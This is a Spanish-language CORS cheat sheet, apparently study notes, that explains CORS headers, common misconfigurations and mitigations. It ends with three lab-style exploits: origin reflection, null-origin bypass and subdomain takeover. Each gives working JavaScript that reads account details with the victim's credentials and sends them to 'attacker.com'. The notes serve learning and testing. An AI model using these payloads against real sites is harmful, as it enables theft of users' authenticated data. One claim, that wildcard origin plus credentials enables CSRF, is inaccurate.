---

### 🌐 **CORS (Cross-Origin Resource Sharing) Cheat Sheet**  

---

#### ❓ **¿Qué es CORS?**  
CORS (Cross-Origin Resource Sharing) es un mecanismo que permite que un servidor indique qué orígenes (dominios, esquemas o puertos) pueden acceder a sus recursos.  
Por defecto, los navegadores aplican la política de **Same-Origin Policy**, que restringe el acceso a recursos desde diferentes dominios.  

---

### 🔧 **Funcionamiento de CORS**  
Cuando una aplicación realiza una solicitud HTTP a un dominio diferente (Cross-Origin), el navegador puede enviar una **preflight request** usando el método **OPTIONS** para verificar si el servidor permite la solicitud.  

El servidor responde con las cabeceras adecuadas:  

- **`Access-Control-Allow-Origin`**: Indica qué orígenes están permitidos (`*` para todos).  
- **`Access-Control-Allow-Methods`**: Métodos HTTP permitidos (e.g., `GET`, `POST`, `PUT`).  
- **`Access-Control-Allow-Headers`**: Encabezados que se pueden usar en la solicitud.  
- **`Access-Control-Allow-Credentials`**: Permite el uso de credenciales si está en `true`.  

---

### 💥 **Vulnerabilidad de CORS**  

#### ⚠️ **1. Permitir todos los orígenes (`*`)**  
Esto puede permitir el acceso a datos sensibles desde cualquier sitio, lo que facilita ataques **CSRF**.  
```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

#### 🚩 **2. Validación débil del origen**  
No verificar correctamente los orígenes permite que **cualquier dominio** acceda a los recursos.  

---

### ✅ **Ejemplo de Configuración Segura**
Permitir solo dominios específicos y métodos seguros:
```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type
Access-Control-Allow-Credentials: true
```

---

### 🛡️ **Medidas de Mitigación**  
1. **Restringir Orígenes:** Evitar el uso de `*` y permitir solo dominios de confianza.  
2. **Validar las Cabeceras:** Asegurarse de que las cabeceras estén correctamente configuradas.  
3. **Monitoreo y Auditoría:** Realizar pruebas periódicas para verificar configuraciones inseguras.  

---

## 🔥 **Cabeceras CORS y Sus Funciones**  
| Cabecera                        | Función                                                                                | Ejemplo                                         |
|--------------------------------|------------------------------------------------------------------------------------------|-------------------------------------------------|
| `Access-Control-Allow-Origin`   | Especifica qué orígenes pueden acceder al recurso.                                        | `Access-Control-Allow-Origin: https://example.com` |
| `Access-Control-Allow-Credentials` | Permite el uso de credenciales (cookies, autenticación HTTP).                             | `Access-Control-Allow-Credentials: true`           |
| `Access-Control-Allow-Methods`  | Métodos HTTP permitidos (`GET`, `POST`, `PUT`).                                           | `Access-Control-Allow-Methods: GET, POST`          |
| `Access-Control-Allow-Headers`  | Cabeceras HTTP permitidas en la solicitud.                                                | `Access-Control-Allow-Headers: Content-Type`       |
| `Access-Control-Expose-Headers` | Cabeceras expuestas al navegador.                                                          | `Access-Control-Expose-Headers: X-Kuma-Revision`    |
| `Access-Control-Max-Age`        | Tiempo en segundos que el resultado de la preflight se almacena en caché.                   | `Access-Control-Max-Age: 3600`                      |
| `Access-Control-Request-Method` | Método HTTP que se usará en la solicitud real (en preflight).                             | `Access-Control-Request-Method: DELETE`             |
| `Access-Control-Request-Headers`| Cabeceras HTTP que se enviarán en la solicitud real.                                       | `Access-Control-Request-Headers: X-PINGOTHER`       |
| `Origin`                        | Especifica el origen de la solicitud.                                                      | `Origin: https://malicioso.com`                     |

---

## 💣 **Payloads y Ataques Relacionados**

### 🐚 **Lab 1: Origin Manipulation**
**Request:**
```http
Origin: https://gustavo.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>
```

---

### 🕵️ **Lab 2: Origin Null Bypass**
**Request:**
```http
Origin: null
```
**Response:**
```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('https://attacker.com/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>"></iframe>
```

---

### 🎯 **Lab 3: Subdomain Takeover with CORS**
**Request:**
```http
Origin: https://gustavo.target.com
```
**Response:**
```http
Access-Control-Allow-Origin: https://gustavo.target.com
Access-Control-Allow-Credentials: true
```

**Exploitation:**
```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://target.com/accountDetails', true);
  xhr.withCredentials = true;
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      fetch('https://attacker.com/log?data=' + xhr.responseText);
    }
  };
  xhr.send(null);
</script>
```

---

💾 **Guarda esta guía en Obsidian para tener siempre a mano las técnicas y ataques relacionados con CORS!** 🚀